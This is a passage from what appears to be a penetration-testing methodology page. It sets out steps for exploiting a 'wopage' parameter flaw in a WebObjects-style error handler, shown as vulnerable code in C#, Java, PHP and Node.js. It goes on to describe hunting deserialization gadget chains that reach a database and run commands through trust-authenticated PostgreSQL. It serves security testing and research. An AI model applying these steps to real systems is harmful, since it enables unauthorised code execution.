{% endtabs %}
{% endstep %}

{% step %}
Check whether request parameters (such as `wopage`) are used directly in the error-handling path and can influence page or component selection without validation

{% tabs %}
{% tab title="C#" %}
```c#
public WOResponse handlePageRestorationErrorInContext(WOContext context)
{
  //...

  string requestedPage = (string)context.request().formValueForKey("wopage"); // [1]
  _logger.error("Page restoration error when requesting page '" + requestedPage + "'");
  return this.pageWithName(requestedPage, context).generateResponse(); // [2]
}
```
{% endtab %}

{% tab title="Java" %}
```java
public WOResponse handlePageRestorationErrorInContext(WOContext context) {
  //...

  String requestedPage = (String)context.request().formValueForKey("wopage"); // [1]
  _logger.error("Page restoration error when requesting page '" + requestedPage + "'");
  return this.pageWithName(requestedPage, context).generateResponse(); // [2]
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function handlePageRestorationErrorInContext($context)
{
  //...

  $requestedPage = $context->request()->formValueForKey("wopage"); // [1]
  $this->_logger->error("Page restoration error when requesting page '" . $requestedPage . "'");
  return $this->pageWithName($requestedPage, $context)->generateResponse(); // [2]
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
handlePageRestorationErrorInContext(context)
{
  //...

  let requestedPage = context.request().formValueForKey("wopage"); // [1]
  this._logger.error("Page restoration error when requesting page '" + requestedPage + "'");
  return this.pageWithName(requestedPage, context).generateResponse(); // [2]
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review the page resolution logic and determine what restrictions are applied to page names and under what conditions these restrictions can be bypassed. If possible, supply a custom value for the `page` parameter through the `wopage` input

{% tabs %}
{% tab title="C#" %}
```c#
public WOComponent pageWithName(string pageName, WOContext context)
{
  bool isComponentRequestWithNullSenderID = context != null && context.senderID() == null && this.componentRequestHandlerKey().equals(context.request().requestHandlerKey());
  bool isMainRequest = pageName == null || pageName.equals("Main") || pageName.startsWith("Ajax") || pageName.contains("Ajax");

  if (isComponentRequestWithNullSenderID || isMainRequest)
  {
      pageName = WHDMain.class.getSimpleName();
  }

  return super.pageWithName(pageName, context);
}
```
{% endtab %}

{% tab title="Java" %}
```java
public WOComponent pageWithName(String pageName, WOContext context) {
  boolean isComponentRequestWithNullSenderID = context != null && context.senderID() == null && this.componentRequestHandlerKey().equals(context.request().requestHandlerKey());
  boolean isMainRequest = pageName == null || pageName.equals("Main") || pageName.startsWith("Ajax") || pageName.contains("Ajax");

  if (isComponentRequestWithNullSenderID || isMainRequest) {
      pageName = WHDMain.class.getSimpleName();
  }

  return super.pageWithName(pageName, context);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function pageWithName($pageName, $context)
{
  $isComponentRequestWithNullSenderID = $context != null
      && $context->senderID() == null
      && $this->componentRequestHandlerKey() == $context->request()->requestHandlerKey();

  $isMainRequest = $pageName == null
      || $pageName == "Main"
      || strpos($pageName, "Ajax") === 0
      || strpos($pageName, "Ajax") !== false;

  if ($isComponentRequestWithNullSenderID || $isMainRequest)
  {
      $pageName = WHDMain::class;
  }

  return parent::pageWithName($pageName, $context);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
pageWithName(pageName, context)
{
  let isComponentRequestWithNullSenderID = context != null
      && context.senderID() == null
      && this.componentRequestHandlerKey().equals(context.request().requestHandlerKey());

  let isMainRequest = pageName == null
      || pageName == "Main"
      || pageName.startsWith("Ajax")
      || pageName.contains("Ajax");

  if (isComponentRequestWithNullSenderID || isMainRequest)
  {
      pageName = WHDMain.class.getSimpleName();
  }

  return super.pageWithName(pageName, context);
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
If previous gadget chains no longer work, extract and review all project dependencies and libraries (`jar` / `dll`)
{% endstep %}

{% step %}
Identify classes that interact with external resources such as databases (JDBC/DataSource), files, or network services
{% endstep %}

{% step %}
Filter these classes and select those that expose configurable setters and properties
{% endstep %}

{% step %}
Identify important properties such as connection strings, validation queries, URLs, and drivers
{% endstep %}

{% step %}
Check whether these properties can be set directly through deserialization
{% endstep %}

{% step %}
Trace the execution flow of the object after deserialization (for example, method invocation, re-serialization, or passing to another method)
{% endstep %}

{% step %}
In the gadget class, identify methods with side effects, such as getters that establish connections or execute queries
{% endstep %}

{% step %}
Check whether execution can be redirected to these methods (for example, through serialization or getter invocation)
{% endstep %}

{% step %}
If a database-based gadget is used, analyze the connection path (localhost or remote), driver type, and port
{% endstep %}

{% step %}
Review database configuration files such as `pg_hba.conf` and identify the authentication method
{% endstep %}

{% step %}
Check whether connections are possible without credentials (for example, trust/local authentication)
{% endstep %}

{% step %}
If a connection can be established, use database functionality to execute commands (for example, malicious queries or command execution)
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
